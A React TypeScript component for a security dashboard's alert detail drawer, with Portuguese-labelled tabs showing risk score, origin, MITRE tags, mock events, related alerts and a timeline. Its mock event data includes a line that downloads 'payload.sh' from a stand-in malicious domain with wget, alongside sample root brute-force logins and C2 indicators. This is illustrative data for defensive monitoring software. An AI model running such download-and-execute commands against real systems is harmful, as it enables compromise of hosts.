/**
 * Alert Detail View (UI 3.9)
 * Detalhamento do alerta em drawer lateral: abas Summary, Events, Evidence, Related.
 */
import { CSSProperties, useState } from "react";
import { colors, motion, radii, spacing, typography } from "../design-system/tokens";
import { Card } from "../design-system/components/primitives";
import { SeverityBadge } from "../design-system/components/badges";
import { Timeline, TimelineItem } from "../design-system/components/Timeline";

export interface AlertDetailViewProps {
  alert: {
    id: string;
    title: string;
    ruleId: string;
    severity: "critical" | "high" | "medium" | "low" | "info";
    status: string;
    riskScore: number;
    sourceHost: string;
    user?: string;
    firstSeen: string;
    lastSeen: string;
    mitre: string[];
    eventCount: number;
    fingerprintHash: string;
  };
  onClose?: () => void;
}

const CodeBadge: React.FC<{ children: string }> = ({ children }) => (
  <span
    style={{
      fontFamily: typography.family.mono,
      fontSize: typography.size.xs,
      padding: `${spacing["1"]} ${spacing["2"]}`,
      background: colors.surfaceAlt,
      border: `1px solid ${colors.border}`,
      borderRadius: radii.sm,
      color: colors.textSecondary,
    }}
  >
    {children}
  </span>
);

const thStyle: CSSProperties = {
  textAlign: "left",
  fontSize: typography.size.xs,
  fontWeight: typography.weight.semibold,
  color: colors.textMuted,
  padding: spacing["2"],
  borderBottom: `1px solid ${colors.border}`,
  whiteSpace: "nowrap",
};

const tdStyle: CSSProperties = {
  fontSize: typography.size.sm,
  color: colors.textPrimary,
  padding: spacing["2"],
  borderBottom: `1px solid ${colors.borderSubtle}`,
};

/* --------------------------- Summary Tab ---------------------------- */

function SummaryTab({ alert }: AlertDetailViewProps) {
  return (
    <div style={{ padding: spacing["4"] }}>
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
          gap: spacing["4"],
          marginBottom: spacing["4"],
        }}
      >
        {/* Risk Score Card */}
        <Card>
          <div style={{ display: "flex", alignItems: "center", gap: spacing["3"] }}>
            <div
              style={{
                width: 80,
                height: 80,
                borderRadius: "50%",
                background: "linear-gradient(135deg, #F85149, #DB6E28)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontSize: "32px",
                fontWeight: "bold",
                color: "white",
              }}
            >
              {alert.riskScore}
            </div>
            <div>
              <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>
                Risk Score
              </div>
              <div style={{ fontSize: "36px", fontWeight: 700, color: "#F85149" }}>
                {alert.riskScore}
              </div>
              <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>
                Crítico
              </div>
            </div>
          </div>
        </Card>

        {/* Origem Card */}
        <Card title="Origem">
          <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
            <div>
              <strong>Host:</strong> {alert.sourceHost}
            </div>
            <div>
              <strong>Usuário:</strong> {alert.user || "—"}
            </div>
            <div>
              <strong>Rule ID:</strong> {alert.ruleId}
            </div>
            <div>
              <strong>Fingerprint:</strong> {alert.fingerprintHash}
            </div>
          </div>
        </Card>

        {/* MITRE ATT&CK Card */}
        <Card title="MITRE ATT&CK">
          <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
            {alert.mitre.map((t) => (
              <span
                key={t}
                style={{
                  padding: "4px 10px",
                  background: colors.surfaceAlt,
                  border: `1px solid ${colors.border}`,
                  borderRadius: 9999,
                  fontSize: typography.size.xs,
                  fontFamily: "monospace",
                  color: colors.textSecondary,
                }}
              >
                {t}
              </span>
            ))}
          </div>
        </Card>
      </div>

      {/* Evidências Coletadas */}
      <h3 style={{ fontSize: typography.size.lg, marginBottom: spacing["3"] }}>
        Evidências Coletadas
      </h3>
      <div style={{ display: "flex", flexWrap: "wrap", gap: spacing["2"] }}>
        <CodeBadge>SHA256: a1b2c3d4e5f6...</CodeBadge>
        <CodeBadge>IP C2: 10.0.0.1</CodeBadge>
        <CodeBadge>Domínio C2: malicious.com</CodeBadge>
        <CodeBadge>User-Agent: Wget/1.21</CodeBadge>
        <CodeBadge>Processo: payload.sh (PID 12455)</CodeBadge>
      </div>
    </div>
  );
}

/* ---------------------------- Events Tab ---------------------------- */

function EventsTab({ }: AlertDetailViewProps) {
  const mockEvents = [
    { ts: "2026-08-04T10:15:00", type: "auth", src: "10.0.0.1", dst: "10.0.1.45", action: "login_failed", detail: "Failed password for root from 10.0.0.1" },
    { ts: "2026-08-04T10:15:02", type: "auth", src: "10.0.0.1", dst: "10.0.0.1", action: "login_failed", detail: "Failed password for root from 10.0.0.1" },
    { ts: "2026-08-04T10:15:05", type: "auth", src: "10.0.0.1", dst: "10.0.0.1", action: "login_success", detail: "Accepted password for root" },
    { ts: "2026-08-04T10:16:00", type: "process", src: "10.0.1.45", dst: "malicious.com", action: "network_connection", detail: "wget http://malicious.com/payload.sh" },
  ];

  return (
    <div style={{ padding: spacing["4"] }}>
      <p style={{ color: colors.textMuted, marginBottom: spacing["4"] }}>
        Eventos brutos que compõem este alerta (últimos {mockEvents.length} eventos)
      </p>
      <div style={{ maxHeight: 400, overflow: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: typography.size.sm }}>
          <thead>
            <tr style={{ borderBottom: `2px solid ${colors.border}` }}>
              <th style={thStyle}>Timestamp</th>
              <th style={thStyle}>Tipo</th>
              <th style={thStyle}>Origem</th>
              <th style={thStyle}>Destino</th>
              <th style={thStyle}>Ação</th>
              <th style={thStyle}>Detalhes</th>
            </tr>
          </thead>
          <tbody>
            {mockEvents.map((row, i) => (
              <tr key={i} style={{ borderBottom: `1px solid ${colors.borderSubtle}` }}>
                <td style={tdStyle}>{row.ts}</td>
                <td style={tdStyle}>
                  <SeverityBadge severity="high">{row.type}</SeverityBadge>
                </td>
                <td style={tdStyle}>{row.src}</td>
                <td style={tdStyle}>{row.dst}</td>
                <td style={tdStyle}>
                  <CodeBadge>{row.action}</CodeBadge>
                </td>
                <td style={{ ...tdStyle, maxWidth: 300, textOverflow: "ellipsis", overflow: "hidden", whiteSpace: "nowrap" }}>
                  {row.detail}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

/* --------------------------- Related Tab ---------------------------- */

function RelatedTab({ }: AlertDetailViewProps) {
  const related = [
    { id: "ALT-002", title: "Malware Execution", severity: "critical" as const, status: "open", rule: "malware-exec" },
    { id: "ALT-003", title: "Lateral Movement - SMB", severity: "high" as const, status: "in_progress", rule: "lateral-smb" },
    { id: "ALT-005", title: "Data Exfiltration", severity: "high" as const, status: "open", rule: "data-exfil" },
  ];

  return (
    <div style={{ padding: spacing["4"] }}>
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: spacing["3"],
        }}
      >
        <h3 style={{ fontSize: typography.size.lg, fontWeight: typography.weight.semibold }}>
          Alertas Relacionados
        </h3>
        <span style={{ fontSize: typography.size.sm, color: colors.textMuted }}>
          {related.length} alertas relacionados
        </span>
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: spacing["2"] }}>
        {related.map((r) => (
          <div
            key={r.id}
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              padding: `${spacing["3"]} ${spacing["4"]}`,
              background: colors.surface,
              border: `1px solid ${colors.border}`,
              borderRadius: "8px",
              marginBottom: spacing["2"],
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: spacing["3"], flex: 1 }}>
              <SeverityBadge severity={r.severity}>
                {r.severity.charAt(0).toUpperCase() + r.severity.slice(1)}
              </SeverityBadge>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 600, color: colors.textPrimary }}>{r.title}</div>
                <div style={{ fontSize: typography.size.xs, color: colors.textMuted }}>
                  Regra: {r.rule}
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* --------------------------- Timeline Tab ---------------------------- */

function TimelineTab({ alert }: AlertDetailViewProps) {
  const timelineItems: TimelineItem[] = [
    {
      id: "1",
      title: "Alerta criado",
      detail: `Regra: ${alert.ruleId}`,
      time: "10:15",
      tone: alert.severity,
      icon: "🚨",
    },
    {
      id: "2",
      title: "Status alterado",
      detail: "Aberto → Em Triagem",
      time: "10:16",
      tone: "neutral" as const,
    },
    {
      id: "3",
      title: "Anotação adicionada",
      detail: "Investigando origem do acesso root",
      time: "10:20",
      tone: "neutral" as const,
    },
    {
      id: "4",
      title: "Evidência adicionada",
      detail: "Hash SHA256: a1b2c3d4...",
      time: "10:25",
      tone: "neutral" as const,
    },
  ];

  return (
    <div style={{ padding: spacing["4"] }}>
      <Timeline items={timelineItems} />
    </div>
  );
}

/* ------------------------ AlertDetailView (main) ------------------------ */

export function AlertDetailView({ alert }: AlertDetailViewProps) {
  const [activeTab, setActiveTab] = useState("summary");

  const tabs = [
    { id: "summary", label: "Resumo" },
    { id: "events", label: "Eventos" },
    { id: "evidence", label: "Evidências" },
    { id: "related", label: "Relacionados" },
    { id: "timeline", label: "Linha do Tempo" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", height: "100%" }}>
      {/* Tab Navigation */}
      <div
        style={{
          display: "flex",
          gap: 0,
          borderBottom: `1px solid ${colors.border}`,
          marginBottom: spacing["3"],
        }}
      >
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            style={{
              padding: `${spacing["2"]} ${spacing["3"]}`,
              fontSize: typography.size.sm,
              fontWeight: tab.id === activeTab ? typography.weight.semibold : typography.weight.regular,
              color: tab.id === activeTab ? colors.textPrimary : colors.textMuted,
              borderBottom: tab.id === activeTab ? `2px solid ${colors.accent}` : "2px solid transparent",
              background: "transparent",
              border: "none",
              cursor: "pointer",
              transition: motion.transition.fast,
            }}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Tab Content */}
      <div style={{ flex: 1, overflow: "auto" }}>
        {activeTab === "summary" && <SummaryTab alert={alert} />}
        {activeTab === "events" && <EventsTab alert={alert} />}
        {activeTab === "evidence" && <SummaryTab alert={alert} />}
        {activeTab === "related" && <RelatedTab alert={alert} />}
        {activeTab === "timeline" && <TimelineTab alert={alert} />}
      </div>
    </div>
  );
}
